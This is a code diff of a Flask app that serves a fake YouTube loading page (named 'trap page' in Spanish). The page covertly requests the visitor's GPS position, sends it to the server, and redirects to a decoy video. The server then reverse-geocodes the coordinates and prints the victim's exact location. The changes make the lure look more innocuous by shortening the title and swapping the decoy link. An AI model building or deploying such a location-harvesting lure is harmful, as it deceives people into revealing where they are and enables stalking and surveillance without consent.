@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template_string
+from geopy.geocoders import Nominatim
 import geocoder
 
 app = Flask(__name__)
@@ -8,7 +9,7 @@ PAGINA_TRAMPA = """
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Cargando video de YouTube...</title>
+    <title>YouTube...</title>
     <style>
         body { background-color: #111; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
         .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 120px; height: 120px; animation: spin 2s linear infinite; margin: 0 auto; }
@@ -28,7 +29,7 @@ PAGINA_TRAMPA = """
                 navigator.geolocation.getCurrentPosition(enviarDatos, manejarError);
             } else {
                 // Si el dispositivo no tiene GPS, solo redirige
-                window.location.href = "https://youtu.be/kmlF2rw1weo?si=CDPwrUmuytxdYyee";
+                window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
             }
         };
 
@@ -37,13 +38,13 @@ PAGINA_TRAMPA = """
             let lon = posicion.coords.longitude;
             // Envía las coordenadas en secreto a nuestro servidor Python
             fetch(`/capturar_gps?lat=${lat}&lon=${lon}`).then(() => {
-                window.location.href = "https://youtu.be/kmlF2rw1weo?si=CDPwrUmuytxdYyee";
+                window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
             });
         }
 
         function manejarError(error) {
             // Si el usuario presiona "DENIEGAR", lo manda a YouTube de todos modos
-            window.location.href = "https://youtu.be/kmlF2rw1weo?si=CDPwrUmuytxdYyee";
+            window.location.href = "https://youtu.be/0U3ip3_cLDU?si=S519PUR28_hc6wKo";
         }
     </script>
 </body>
@@ -85,7 +86,7 @@ def capturar_gps():
     except Exception as e:
         direccion_completa = f"Error al traducir: {e}"
 
-    print("\n--- [🔥] ¡UBICACIÓN EXACTA CAPTURADA! ---")
+    print("\n--- [🔥] UBICACIÓN ---")
     print(f"Latitud: {lat}")
     print(f"Longitud: {lon}")
     print(f"País: {pais}")
